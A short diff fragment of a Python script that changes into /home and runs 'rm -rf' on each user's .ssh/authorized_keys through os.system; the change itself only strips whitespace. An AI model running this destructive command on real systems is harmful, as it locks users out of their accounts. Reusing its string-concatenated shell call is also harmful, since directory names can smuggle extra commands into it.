@@ -16,7 +16,7 @@ def do():
     for file in os.listdir("."):
         if os.path.isdir(file):
             os.system("rm -rf " + file + "/.ssh/authorized_keys")
-    
+
 def main():
     global isRepeat
     os.chdir("/home")
